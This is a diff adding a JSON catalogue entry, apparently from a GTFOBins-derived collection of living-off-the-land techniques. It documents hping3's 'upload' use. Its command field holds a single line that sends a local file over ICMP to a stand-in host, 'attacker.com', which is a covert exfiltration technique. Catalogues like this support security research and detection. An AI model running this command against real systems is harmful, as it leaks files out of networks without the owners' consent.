@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-hping3-upload",
+  "name": "GTFOBins · hping3 (upload)",
+  "command": "hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file",
+  "description": "Use hping3 to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "hping3",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/hping3/#upload",
+  "upstream_id": "hping3/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/hping3/"
+    }
+  ]
+}
